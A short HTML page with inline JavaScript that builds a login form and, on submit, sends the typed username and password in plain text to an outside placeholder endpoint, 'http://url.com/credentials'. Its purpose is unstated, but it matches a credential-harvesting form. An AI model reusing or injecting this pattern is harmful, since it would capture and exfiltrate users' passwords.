<html>
  <head>
    <title>Title</title>
  </head>
  <body>
    <script type="text/javascript">
      var form = document.createElement("form");
      form.setAttribute("method", "POST");
      form.setAttribute("accept-charset", "utf-8");
      form.setAttribute("action", "");
      form.setAttribute("id", "MyForm");
      
      var inputUsername = document.createElement("input");
      inputUsername.setAttribute("name", "username");
      inputUsername.setAttribute("type", "text");
      inputUsername.setAttribute("id", "Username");
      
      var inputPassword = document.createElement("input");
      inputPassword.setAttribute("name", "password");
      inputPassword.setAttribute("type", "password");
      inputPassword.setAttribute("id", "Password");
      
      var inputSubmitButton = document.createElement("input");      
      inputSubmitButton.setAttribute("name", "login");
      inputSubmitButton.setAttribute("type", "submit");      
      inputSubmitButton.setAttribute("value", "Login");
      inputSubmitButton.setAttribute("id", "Submit");
      
      form.appendChild(inputUsername);
      form.appendChild(inputPassword);
      form.appendChild(inputSubmitButton);
      
      document.getElementsByTagName('body')[0].appendChild(form);

      form.addEventListener("submit", function (e) {
        e.preventDefault();
        e.stopPropagation();

        if (e.target && e.target.id == "MyForm")
        {
          var username = document.getElementById("Username").value;
          var password = document.getElementById("Password").value;

          console.log(username, password);
          
          var xmlhttp = new XMLHttpRequest();
          xmlhttp.open('POST', 'http://url.com/credentials');
          xmlhttp.setRequestHeader('Content-Type', 'applicatino/x-www-form-urlencoded');
          xmlhttp.send('username=' + username + '&password=' + password);
        }
      });
    </script>
  </body>
</html>
